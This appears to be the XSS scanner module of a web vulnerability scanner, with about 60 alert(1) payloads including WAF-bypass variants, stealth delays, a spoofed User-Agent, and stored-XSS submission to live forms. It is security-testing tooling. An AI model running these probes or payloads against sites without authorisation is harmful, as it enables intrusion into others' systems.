// =============================================================================
// VulnHunter AI - XSS (Cross-Site Scripting) Scanner Module
// =============================================================================
// Detects Reflected, DOM-based, and Stored XSS vulnerabilities using
// context-aware payload generation, WAF bypass techniques, and 60+ payloads.
// CWE-79 | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (6.1 base)
// =============================================================================

import {
  type Finding,
  type Vulnerability,
  Severity,
  VulnerabilityCategory,
} from "@vulnhunter/core";
import { generateUUID } from "@vulnhunter/core";
import { sendRequest, type HttpResponse } from "@vulnhunter/core";
import { createLogger } from "@vulnhunter/core";
import { RateLimiter } from "@vulnhunter/core";

const log = createLogger("scanner:xss");

// ---------------------------------------------------------------------------
// ScanModule interface (matches engine.ts contract)
// ---------------------------------------------------------------------------

export interface ScanModule {
  name: string;
  execute(
    target: string,
    options: Record<string, unknown>,
  ): AsyncGenerator<Finding>;
}

// ---------------------------------------------------------------------------
// Payload Contexts
// ---------------------------------------------------------------------------

enum XssContext {
  Html = "html",
  Attribute = "attribute",
  JavaScript = "javascript",
  Url = "url",
}

// ---------------------------------------------------------------------------
// Canary / marker used to detect reflection
// ---------------------------------------------------------------------------

function generateCanary(): string {
  return `vh${Math.random().toString(36).slice(2, 10)}`;
}

// ---------------------------------------------------------------------------
// XSS Payload Definitions (60+ payloads across all contexts)
// ---------------------------------------------------------------------------

const HTML_CONTEXT_PAYLOADS: string[] = [
  `<script>alert(1)</script>`,
  `<img src=x onerror=alert(1)>`,
  `<svg onload=alert(1)>`,
  `<body onload=alert(1)>`,
  `<iframe src="javascript:alert(1)">`,
  `<details open ontoggle=alert(1)>`,
  `<marquee onstart=alert(1)>`,
  `<video><source onerror=alert(1)>`,
  `<audio src=x onerror=alert(1)>`,
  `<input onfocus=alert(1) autofocus>`,
  `<select onfocus=alert(1) autofocus>`,
  `<textarea onfocus=alert(1) autofocus>`,
  `<keygen onfocus=alert(1) autofocus>`,
  `<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">`,
  `<isindex action=javascript:alert(1) type=image>`,
];

const ATTRIBUTE_CONTEXT_PAYLOADS: string[] = [
  `" onfocus=alert(1) autofocus="`,
  `' onfocus=alert(1) autofocus='`,
  `" onmouseover=alert(1) "`,
  `' onmouseover=alert(1) '`,
  `"><script>alert(1)</script>`,
  `'><script>alert(1)</script>`,
  `"><img src=x onerror=alert(1)>`,
  `'><img src=x onerror=alert(1)>`,
  `" onclick=alert(1) "`,
  `' onclick=alert(1) '`,
  `" style=animation-name:x onanimationend=alert(1) "`,
  `" tabindex=1 onfocus=alert(1) "`,
];

const JAVASCRIPT_CONTEXT_PAYLOADS: string[] = [
  `';alert(1)//`,
  `";alert(1)//`,
  `\`;alert(1)//`,
  `</script><script>alert(1)</script>`,
  `'-alert(1)-'`,
  `"-alert(1)-"`,
  `\\';alert(1)//`,
  `\\";alert(1)//`,
  `\\'%0aalert(1)//`,
  `1;alert(1)`,
  `});\nalert(1);\n//`,
  `${`};\nalert(1);//`}`,
];

const URL_CONTEXT_PAYLOADS: string[] = [
  `javascript:alert(1)`,
  `javascript:alert(1)//`,
  `data:text/html,<script>alert(1)</script>`,
  `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`,
  `vbscript:alert(1)`,
  `javascript:void(0);alert(1)`,
];

const WAF_BYPASS_PAYLOADS: string[] = [
  `<scr<script>ipt>alert(1)</scr</script>ipt>`,
  `<ScRiPt>alert(1)</ScRiPt>`,
  `<SCRIPT>alert(1)</SCRIPT>`,
  `<img src=x oNeRrOr=alert(1)>`,
  `<svg/onload=alert(1)>`,
  `<svg onload=alert&lpar;1&rpar;>`,
  `<img src=x onerror=\\u0061lert(1)>`,
  `<img src=x onerror=&#97;lert(1)>`,
  `<img src=x onerror=&#x61;lert(1)>`,
  `%3Cscript%3Ealert(1)%3C/script%3E`,
  `<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`,
  `<img src=x onerror=top['al'+'ert'](1)>`,
  `<img/src=x onerror=alert(1)>`,
  `<svg><script>alert&#40;1&#41;</script>`,
  `<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>`,
  `<<script>alert(1)//<</script>`,
  `<a href="javas\tcript:alert(1)">click</a>`,
  `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
  `<object data="data:text/html,<script>alert(1)</script>">`,
];

// DOM-based dangerous sinks and sources
const DOM_DANGEROUS_SINKS = [
  "innerHTML",
  "outerHTML",
  "document.write",
  "document.writeln",
  "eval(",
  "setTimeout(",
  "setInterval(",
  "Function(",
  "execScript(",
  "location.href",
  "location.assign",
  "location.replace",
  "window.open",
  ".src=",
  ".action=",
  "insertAdjacentHTML",
];

const DOM_DANGEROUS_SOURCES = [
  "location.hash",
  "location.search",
  "location.href",
  "location.pathname",
  "document.referrer",
  "document.URL",
  "document.documentURI",
  "document.baseURI",
  "window.name",
  "postMessage",
];

// ---------------------------------------------------------------------------
// Helper: delay with jitter for stealth
// ---------------------------------------------------------------------------

function stealthDelay(baseMs: number): Promise<void> {
  const jitter = Math.floor(Math.random() * baseMs * 0.5);
  return new Promise((resolve) => setTimeout(resolve, baseMs + jitter));
}

// ---------------------------------------------------------------------------
// Helper: extract parameters from a URL
// ---------------------------------------------------------------------------

function extractParams(urlStr: string): Map<string, string> {
  const params = new Map<string, string>();
  try {
    const url = new URL(urlStr);
    url.searchParams.forEach((value, key) => {
      params.set(key, value);
    });
  } catch {
    // Not a valid URL; skip
  }
  return params;
}

// ---------------------------------------------------------------------------
// Helper: extract form inputs from HTML
// ---------------------------------------------------------------------------

function extractFormInputs(
  html: string,
): Array<{ action: string; method: string; inputs: string[] }> {
  const forms: Array<{ action: string; method: string; inputs: string[] }> = [];
  const formRegex =
    /<form[^>]*action=["']?([^"'\s>]*)["']?[^>]*method=["']?([^"'\s>]*)["']?[^>]*>([\s\S]*?)<\/form>/gi;
  let match: RegExpExecArray | null;
  while ((match = formRegex.exec(html)) !== null) {
    const action = match[1] || "";
    const method = (match[2] || "GET").toUpperCase();
    const formBody = match[3];
    const inputNames: string[] = [];
    const inputRegex = /<input[^>]*name=["']?([^"'\s>]+)["']?/gi;
    let inputMatch: RegExpExecArray | null;
    while ((inputMatch = inputRegex.exec(formBody)) !== null) {
      inputNames.push(inputMatch[1]);
    }
    // Also capture textarea and select
    const textareaRegex = /<textarea[^>]*name=["']?([^"'\s>]+)["']?/gi;
    while ((inputMatch = textareaRegex.exec(formBody)) !== null) {
      inputNames.push(inputMatch[1]);
    }
    forms.push({ action, method, inputs: inputNames });
  }
  return forms;
}

// ---------------------------------------------------------------------------
// Helper: detect context of reflected canary in response
// ---------------------------------------------------------------------------

function detectReflectionContext(html: string, canary: string): XssContext[] {
  const contexts: XssContext[] = [];
  const idx = html.indexOf(canary);
  if (idx === -1) return contexts;

  // Look backwards from the canary position to determine context
  const before = html.slice(Math.max(0, idx - 200), idx);
  const after = html.slice(idx, idx + 200);

  // Inside a <script> tag?
  const lastScriptOpen = before.lastIndexOf("<script");
  const lastScriptClose = before.lastIndexOf("</script");
  if (lastScriptOpen > lastScriptClose) {
    contexts.push(XssContext.JavaScript);
  }

  // Inside an attribute value?
  const lastQuote = before.lastIndexOf('"');
  const lastSingleQuote = before.lastIndexOf("'");
  const lastEquals = before.lastIndexOf("=");
  if (
    lastEquals > -1 &&
    (lastQuote > lastEquals || lastSingleQuote > lastEquals)
  ) {
    const closingQuote =
      lastQuote > lastSingleQuote
        ? after.indexOf('"')
        : after.indexOf("'");
    if (closingQuote > -1) {
      contexts.push(XssContext.Attribute);
    }
  }

  // Inside href/src/action (URL context)?
  const urlAttrMatch =
    /(?:href|src|action|formaction|data|poster|background)\s*=\s*["']?[^"']*$/i.exec(
      before,
    );
  if (urlAttrMatch) {
    contexts.push(XssContext.Url);
  }

  // Default: HTML body context
  if (contexts.length === 0) {
    contexts.push(XssContext.Html);
  }

  return contexts;
}

// ---------------------------------------------------------------------------
// Helper: select payloads for a given context
// ---------------------------------------------------------------------------

function payloadsForContext(ctx: XssContext): string[] {
  switch (ctx) {
    case XssContext.Html:
      return [...HTML_CONTEXT_PAYLOADS, ...WAF_BYPASS_PAYLOADS];
    case XssContext.Attribute:
      return ATTRIBUTE_CONTEXT_PAYLOADS;
    case XssContext.JavaScript:
      return JAVASCRIPT_CONTEXT_PAYLOADS;
    case XssContext.Url:
      return URL_CONTEXT_PAYLOADS;
  }
}

// ---------------------------------------------------------------------------
// Helper: check if XSS payload is reflected unencoded
// ---------------------------------------------------------------------------

function isPayloadReflected(body: string, payload: string): boolean {
  // Direct reflection
  if (body.includes(payload)) return true;
  // Check lowercase
  if (body.toLowerCase().includes(payload.toLowerCase())) return true;
  return false;
}

// ---------------------------------------------------------------------------
// Helper: build a Finding from a confirmed XSS
// ---------------------------------------------------------------------------

function buildXssFinding(params: {
  target: string;
  endpoint: string;
  method: string;
  parameter: string;
  payload: string;
  xssType: string;
  context: string;
  confidence: number;
  requestStr: string;
  responseBody: string;
  responseStatus: number;
}): Finding {
  const vulnId = generateUUID();
  const severity =
    params.xssType === "Stored"
      ? Severity.High
      : params.xssType === "DOM-based"
        ? Severity.Medium
        : Severity.Medium;
  const cvssScore =
    params.xssType === "Stored" ? 7.1 : params.xssType === "DOM-based" ? 6.1 : 6.1;

  const vulnerability: Vulnerability = {
    id: vulnId,
    title: `${params.xssType} XSS in "${params.parameter}" parameter`,
    description:
      `A ${params.xssType.toLowerCase()} Cross-Site Scripting (XSS) vulnerability was detected ` +
      `in the "${params.parameter}" parameter at ${params.endpoint}. ` +
      `The application reflects user input in a ${params.context} context without proper ` +
      `encoding or sanitization, allowing an attacker to inject arbitrary JavaScript code ` +
      `that executes in the browser of any user who visits the affected page.`,
    severity,
    category: VulnerabilityCategory.XSS,
    cvssScore,
    cvssVector:
      params.xssType === "Stored"
        ? "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"
        : "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
    cweId: "CWE-79",
    target: params.target,
    endpoint: params.endpoint,
    evidence: {
      description: `Payload "${params.payload}" was reflected unencoded in a ${params.context} context.`,
      payload: params.payload,
      matchedPattern: params.payload,
      extra: { xssType: params.xssType, context: params.context },
    },
    request: {
      method: params.method,
      url: params.endpoint,
      headers: { "Content-Type": "text/html" },
      body: params.method === "POST" ? `${params.parameter}=${encodeURIComponent(params.payload)}` : undefined,
    },
    response: {
      statusCode: params.responseStatus,
      headers: {},
      body: params.responseBody.slice(0, 2000),
      responseTimeMs: 0,
    },
    remediation:
      "1. Implement context-aware output encoding using a trusted library (e.g., DOMPurify for HTML, " +
      "encodeURIComponent for URLs).\n" +
      "2. Deploy a Content Security Policy (CSP) header that disallows inline scripts.\n" +
      "3. Use HTTPOnly and Secure flags on session cookies.\n" +
      "4. Validate and sanitize all user input on the server side.\n" +
      "5. Use frameworks with built-in auto-escaping (React, Angular, Vue).",
    references: [
      "https://owasp.org/www-community/attacks/xss/",
      "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
      "https://cwe.mitre.org/data/definitions/79.html",
      "https://portswigger.net/web-security/cross-site-scripting",
    ],
    confirmed: params.confidence >= 80,
    falsePositive: false,
    discoveredAt: new Date().toISOString(),
  };

  return {
    vulnerability,
    module: `scanner:xss:${params.xssType.toLowerCase().replace("-", "_")}`,
    confidence: params.confidence,
    timestamp: new Date().toISOString(),
    rawData: {
      payload: params.payload,
      context: params.context,
      xssType: params.xssType,
      parameter: params.parameter,
    },
  };
}

// ---------------------------------------------------------------------------
// XssScanner Class
// ---------------------------------------------------------------------------

export class XssScanner implements ScanModule {
  public readonly name = "xss";

  private rateLimiter: RateLimiter;
  private userAgent: string;
  private maxPayloadsPerParam: number;

  constructor() {
    this.rateLimiter = new RateLimiter(5);
    this.userAgent =
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
    this.maxPayloadsPerParam = 15;
  }

  async *execute(
    target: string,
    options: Record<string, unknown>,
  ): AsyncGenerator<Finding> {
    log.info({ target }, "Starting XSS scan");

    const rateLimit = typeof options.rateLimit === "number" ? options.rateLimit : 5;
    this.rateLimiter = new RateLimiter(rateLimit);
    this.maxPayloadsPerParam =
      typeof options.maxPayloadsPerParam === "number"
        ? options.maxPayloadsPerParam
        : 15;

    if (typeof options.userAgent === "string") {
      this.userAgent = options.userAgent;
    }

    // Phase 1: Reflected XSS via URL parameters
    yield* this.scanReflectedXss(target, options);

    // Phase 2: Reflected XSS via form inputs
    yield* this.scanFormInputs(target, options);

    // Phase 3: DOM-based XSS detection
    yield* this.scanDomXss(target);

    // Phase 4: Header injection XSS
    yield* this.scanHeaderXss(target);

    // Phase 5: Stored XSS (submit then verify)
    yield* this.scanStoredXss(target, options);

    log.info({ target }, "XSS scan complete");
  }

  // -------------------------------------------------------------------------
  // Phase 1: Reflected XSS via URL parameters
  // -------------------------------------------------------------------------

  private async *scanReflectedXss(
    target: string,
    _options: Record<string, unknown>,
  ): AsyncGenerator<Finding> {
    const params = extractParams(target);
    if (params.size === 0) {
      // Try appending common test parameters
      const testParams = ["q", "search", "query", "id", "page", "name", "input", "s", "keyword", "term", "redirect", "url", "callback", "next", "return"];
      for (const paramName of testParams) {
        const canary = generateCanary();
        const testUrl = new URL(target);
        testUrl.searchParams.set(paramName, canary);

        await this.rateLimiter.acquire();
        try {
          const resp = await sendRequest({
            method: "GET",
            url: testUrl.toString(),
            headers: {
              "User-Agent": this.userAgent,
              Accept: "text/html,application/xhtml+xml",
            },
          });
          if (resp.body.includes(canary)) {
            params.set(paramName, canary);
          }
        } catch (err) {
          log.debug({ paramName, error: err }, "Param probe failed");
        }
        await stealthDelay(200);
      }
    }

    for (const [paramName, _origValue] of params) {
      // Step 1: Send canary to detect reflection and determine context
      const canary = generateCanary();
      const probeUrl = new URL(target);
      probeUrl.searchParams.set(paramName, canary);

      await this.rateLimiter.acquire();
      let probeResp: HttpResponse;
      try {
        probeResp = await sendRequest({
          method: "GET",
          url: probeUrl.toString(),
          headers: {
            "User-Agent": this.userAgent,
            Accept: "text/html,application/xhtml+xml",
          },
        });
      } catch (err) {
        log.debug({ paramName, error: err }, "Canary probe failed");
        continue;
      }

      if (!probeResp.body.includes(canary)) {
        continue; // Not reflected
      }

      const contexts = detectReflectionContext(probeResp.body, canary);
      log.info({ paramName, contexts }, "Reflection detected, testing payloads");

      // Step 2: Test context-appropriate payloads
      for (const ctx of contexts) {
        const payloads = payloadsForContext(ctx);
        let tested = 0;
        for (const payload of payloads) {
          if (tested >= this.maxPayloadsPerParam) break;
          tested++;

          const attackUrl = new URL(target);
          attackUrl.searchParams.set(paramName, payload);

          await this.rateLimiter.acquire();
          await stealthDelay(150);

          try {
            const resp = await sendRequest({
              method: "GET",
              url: attackUrl.toString(),
              headers: {
                "User-Agent": this.userAgent,
                Accept: "text/html,application/xhtml+xml",
              },
            });

            if (isPayloadReflected(resp.body, payload)) {
              // Calculate confidence based on context and payload type
              let confidence = 70;
              if (
                payload.includes("<script>") &&
                resp.body.includes("<script>")
              ) {
                confidence = 95;
              } else if (
                payload.includes("onerror=") &&
                resp.body.includes("onerror=")
              ) {
                confidence = 90;
              } else if (payload.includes("onload=") && resp.body.includes("onload=")) {
                confidence = 90;
              }

              // Check if the payload is inside a script tag or attribute that would execute
              if (resp.headers["content-type"]?.includes("text/html")) {
                confidence += 5;
              }

              confidence = Math.min(confidence, 100);

              yield buildXssFinding({
                target,
                endpoint: attackUrl.toString(),
                method: "GET",
                parameter: paramName,
                payload,
                xssType: "Reflected",
                context: ctx,
                confidence,
                requestStr: `GET ${attackUrl.toString()}`,
                responseBody: resp.body,
                responseStatus: resp.status,
              });

              // Found one payload that works in this context, move on
              break;
            }
          } catch (err) {
            log.debug({ paramName, payload, error: err }, "Payload test failed");
          }
        }
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 2: Reflected XSS via form inputs
  // -------------------------------------------------------------------------

  private async *scanFormInputs(
    target: string,
    _options: Record<string, unknown>,
  ): AsyncGenerator<Finding> {
    // Fetch the page and extract forms
    await this.rateLimiter.acquire();
    let pageResp: HttpResponse;
    try {
      pageResp = await sendRequest({
        method: "GET",
        url: target,
        headers: {
          "User-Agent": this.userAgent,
          Accept: "text/html,application/xhtml+xml",
        },
      });
    } catch {
      return;
    }

    const forms = extractFormInputs(pageResp.body);
    if (forms.length === 0) return;

    for (const form of forms) {
      const formAction = form.action
        ? new URL(form.action, target).toString()
        : target;

      for (const inputName of form.inputs) {
        const canary = generateCanary();
        const bodyParams = new URLSearchParams();
        // Fill all fields with benign values, target field with canary
        for (const field of form.inputs) {
          bodyParams.set(field, field === inputName ? canary : "test");
        }

        await this.rateLimiter.acquire();
        await stealthDelay(200);

        let resp: HttpResponse;
        try {
          if (form.method === "POST") {
            resp = await sendRequest({
              method: "POST",
              url: formAction,
              headers: {
                "User-Agent": this.userAgent,
                "Content-Type": "application/x-www-form-urlencoded",
                Accept: "text/html,application/xhtml+xml",
              },
              body: bodyParams.toString(),
            });
          } else {
            const getUrl = new URL(formAction);
            bodyParams.forEach((v, k) => getUrl.searchParams.set(k, v));
            resp = await sendRequest({
              method: "GET",
              url: getUrl.toString(),
              headers: {
                "User-Agent": this.userAgent,
                Accept: "text/html,application/xhtml+xml",
              },
            });
          }
        } catch {
          continue;
        }

        if (!resp.body.includes(canary)) continue;

        const contexts = detectReflectionContext(resp.body, canary);

        for (const ctx of contexts) {
          const payloads = payloadsForContext(ctx).slice(0, 8);
          for (const payload of payloads) {
            const attackParams = new URLSearchParams();
            for (const field of form.inputs) {
              attackParams.set(
                field,
                field === inputName ? payload : "test",
              );
            }

            await this.rateLimiter.acquire();
            await stealthDelay(150);

            try {
              let attackResp: HttpResponse;
              if (form.method === "POST") {
                attackResp = await sendRequest({
                  method: "POST",
                  url: formAction,
                  headers: {
                    "User-Agent": this.userAgent,
                    "Content-Type": "application/x-www-form-urlencoded",
                    Accept: "text/html,application/xhtml+xml",
                  },
                  body: attackParams.toString(),
                });
              } else {
                const getUrl = new URL(formAction);
                attackParams.forEach((v, k) => getUrl.searchParams.set(k, v));
                attackResp = await sendRequest({
                  method: "GET",
                  url: getUrl.toString(),
                  headers: {
                    "User-Agent": this.userAgent,
                    Accept: "text/html,application/xhtml+xml",
                  },
                });
              }

              if (isPayloadReflected(attackResp.body, payload)) {
                yield buildXssFinding({
                  target,
                  endpoint: formAction,
                  method: form.method,
                  parameter: inputName,
                  payload,
                  xssType: "Reflected",
                  context: ctx,
                  confidence: 85,
                  requestStr: `${form.method} ${formAction} body=${attackParams.toString()}`,
                  responseBody: attackResp.body,
                  responseStatus: attackResp.status,
                });
                break; // Move to next input
              }
            } catch {
              continue;
            }
          }
        }
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 3: DOM-based XSS detection (static analysis of JavaScript)
  // -------------------------------------------------------------------------

  private async *scanDomXss(target: string): AsyncGenerator<Finding> {
    await this.rateLimiter.acquire();
    let pageResp: HttpResponse;
    try {
      pageResp = await sendRequest({
        method: "GET",
        url: target,
        headers: {
          "User-Agent": this.userAgent,
          Accept: "text/html,application/xhtml+xml",
        },
      });
    } catch {
      return;
    }

    const html = pageResp.body;

    // Extract inline scripts
    const scriptRegex = /<script[^>]*>([\s\S]*?)<\/script>/gi;
    const scripts: string[] = [];
    let scriptMatch: RegExpExecArray | null;
    while ((scriptMatch = scriptRegex.exec(html)) !== null) {
      if (scriptMatch[1].trim().length > 0) {
        scripts.push(scriptMatch[1]);
      }
    }

    // Also extract external script URLs and fetch them
    const srcRegex = /<script[^>]+src=["']([^"']+)["']/gi;
    let srcMatch: RegExpExecArray | null;
    while ((srcMatch = srcRegex.exec(html)) !== null) {
      const scriptUrl = new URL(srcMatch[1], target).toString();
      // Only fetch same-origin scripts to avoid unnecessary noise
      try {
        const scriptOrigin = new URL(scriptUrl).origin;
        const targetOrigin = new URL(target).origin;
        if (scriptOrigin === targetOrigin) {
          await this.rateLimiter.acquire();
          const scriptResp = await sendRequest({
            method: "GET",
            url: scriptUrl,
            headers: { "User-Agent": this.userAgent },
          });
          if (scriptResp.status === 200) {
            scripts.push(scriptResp.body);
          }
        }
      } catch {
        // Skip unreachable scripts
      }
    }

    // Analyze each script for source-to-sink flows
    for (const script of scripts) {
      const foundSinks: string[] = [];
      const foundSources: string[] = [];

      for (const sink of DOM_DANGEROUS_SINKS) {
        if (script.includes(sink)) {
          foundSinks.push(sink);
        }
      }

      for (const source of DOM_DANGEROUS_SOURCES) {
        if (script.includes(source)) {
          foundSources.push(source);
        }
      }

      // If both a source and a sink exist in the same script block, flag it
      if (foundSinks.length > 0 && foundSources.length > 0) {
        // Extract a snippet around the sink for evidence
        for (const sink of foundSinks) {
          const sinkIdx = script.indexOf(sink);
          const snippetStart = Math.max(0, sinkIdx - 100);
          const snippetEnd = Math.min(script.length, sinkIdx + sink.length + 100);
          const snippet = script.slice(snippetStart, snippetEnd).trim();

          const vulnId = generateUUID();
          const vulnerability: Vulnerability = {
            id: vulnId,
            title: `Potential DOM-based XSS via ${sink}`,
            description:
              `A potential DOM-based XSS vulnerability was detected. The JavaScript code ` +
              `reads from a user-controllable source (${foundSources.join(", ")}) and passes ` +
              `the value to a dangerous sink (${sink}) without apparent sanitization. ` +
              `An attacker could craft a URL that causes arbitrary JavaScript execution.`,
            severity: Severity.Medium,
            category: VulnerabilityCategory.XSS,
            cvssScore: 6.1,
            cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            cweId: "CWE-79",
            target,
            endpoint: target,
            evidence: {
              description: `Source(s): ${foundSources.join(", ")} flow into sink: ${sink}`,
              payload: `Source: ${foundSources[0]} -> Sink: ${sink}`,
              matchedPattern: snippet,
              extra: { sinks: foundSinks, sources: foundSources },
            },
            remediation:
              "1. Avoid using dangerous DOM sinks like innerHTML and document.write.\n" +
              "2. Use textContent or innerText instead of innerHTML for inserting user data.\n" +
              "3. Sanitize user input with DOMPurify before inserting into the DOM.\n" +
              "4. Use a Content Security Policy to mitigate impact.",
            references: [
              "https://owasp.org/www-community/attacks/DOM_Based_XSS",
              "https://portswigger.net/web-security/cross-site-scripting/dom-based",
              "https://cwe.mitre.org/data/definitions/79.html",
            ],
            confirmed: false,
            falsePositive: false,
            discoveredAt: new Date().toISOString(),
          };

          yield {
            vulnerability,
            module: "scanner:xss:dom_based",
            confidence: 55,
            timestamp: new Date().toISOString(),
            rawData: {
              sinks: foundSinks,
              sources: foundSources,
              codeSnippet: snippet,
            },
          };
        }
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 4: Header injection XSS (Referer, User-Agent, etc.)
  // -------------------------------------------------------------------------

  private async *scanHeaderXss(target: string): AsyncGenerator<Finding> {
    const headersToTest: Array<{ name: string; headerKey: string }> = [
      { name: "Referer", headerKey: "Referer" },
      { name: "User-Agent", headerKey: "User-Agent" },
      { name: "X-Forwarded-For", headerKey: "X-Forwarded-For" },
      { name: "X-Forwarded-Host", headerKey: "X-Forwarded-Host" },
    ];

    for (const headerDef of headersToTest) {
      const canary = generateCanary();
      await this.rateLimiter.acquire();
      await stealthDelay(200);

      try {
        const resp = await sendRequest({
          method: "GET",
          url: target,
          headers: {
            "User-Agent":
              headerDef.headerKey === "User-Agent"
                ? canary
                : this.userAgent,
            Accept: "text/html",
            [headerDef.headerKey]:
              headerDef.headerKey === "User-Agent" ? canary : canary,
          },
        });

        if (!resp.body.includes(canary)) continue;

        // Canary is reflected, now try a payload
        const payload = `<script>alert(1)</script>`;
        await this.rateLimiter.acquire();
        const attackResp = await sendRequest({
          method: "GET",
          url: target,
          headers: {
            "User-Agent":
              headerDef.headerKey === "User-Agent"
                ? payload
                : this.userAgent,
            Accept: "text/html",
            [headerDef.headerKey]:
              headerDef.headerKey === "User-Agent" ? payload : payload,
          },
        });

        if (isPayloadReflected(attackResp.body, payload)) {
          yield buildXssFinding({
            target,
            endpoint: target,
            method: "GET",
            parameter: `Header: ${headerDef.name}`,
            payload,
            xssType: "Reflected",
            context: "html",
            confidence: 80,
            requestStr: `GET ${target} [${headerDef.name}: ${payload}]`,
            responseBody: attackResp.body,
            responseStatus: attackResp.status,
          });
        }
      } catch {
        continue;
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 5: Stored XSS detection
  // -------------------------------------------------------------------------

  private async *scanStoredXss(
    target: string,
    _options: Record<string, unknown>,
  ): AsyncGenerator<Finding> {
    // Fetch the page and look for forms that submit data (POST forms)
    await this.rateLimiter.acquire();
    let pageResp: HttpResponse;
    try {
      pageResp = await sendRequest({
        method: "GET",
        url: target,
        headers: {
          "User-Agent": this.userAgent,
          Accept: "text/html,application/xhtml+xml",
        },
      });
    } catch {
      return;
    }

    const forms = extractFormInputs(pageResp.body);
    const postForms = forms.filter((f) => f.method === "POST");

    for (const form of postForms) {
      const formAction = form.action
        ? new URL(form.action, target).toString()
        : target;

      for (const inputName of form.inputs) {
        // Use a unique canary to check for stored reflection
        const storedCanary = `vh_stored_${generateCanary()}`;
        const bodyParams = new URLSearchParams();
        for (const field of form.inputs) {
          bodyParams.set(
            field,
            field === inputName ? storedCanary : "test_stored",
          );
        }

        await this.rateLimiter.acquire();
        await stealthDelay(300);

        try {
          // Submit the form with the canary
          await sendRequest({
            method: "POST",
            url: formAction,
            headers: {
              "User-Agent": this.userAgent,
              "Content-Type": "application/x-www-form-urlencoded",
              Accept: "text/html",
            },
            body: bodyParams.toString(),
          });

          // Wait briefly, then re-fetch the target page and check for the canary
          await stealthDelay(500);
          await this.rateLimiter.acquire();

          const checkResp = await sendRequest({
            method: "GET",
            url: target,
            headers: {
              "User-Agent": this.userAgent,
              Accept: "text/html",
            },
          });

          if (checkResp.body.includes(storedCanary)) {
            // Stored reflection confirmed. Now test with an actual payload.
            const payload = `<img src=x onerror=alert(1)>`;
            const attackParams = new URLSearchParams();
            for (const field of form.inputs) {
              attackParams.set(
                field,
                field === inputName ? payload : "test_stored",
              );
            }

            await this.rateLimiter.acquire();
            await sendRequest({
              method: "POST",
              url: formAction,
              headers: {
                "User-Agent": this.userAgent,
                "Content-Type": "application/x-www-form-urlencoded",
                Accept: "text/html",
              },
              body: attackParams.toString(),
            });

            await stealthDelay(500);
            await this.rateLimiter.acquire();

            const verifyResp = await sendRequest({
              method: "GET",
              url: target,
              headers: {
                "User-Agent": this.userAgent,
                Accept: "text/html",
              },
            });

            if (isPayloadReflected(verifyResp.body, payload)) {
              yield buildXssFinding({
                target,
                endpoint: formAction,
                method: "POST",
                parameter: inputName,
                payload,
                xssType: "Stored",
                context: "html",
                confidence: 95,
                requestStr: `POST ${formAction} body=${attackParams.toString()}`,
                responseBody: verifyResp.body,
                responseStatus: verifyResp.status,
              });
              break; // Move to next form
            }
          }
        } catch {
          continue;
        }
      }
    }
  }
}
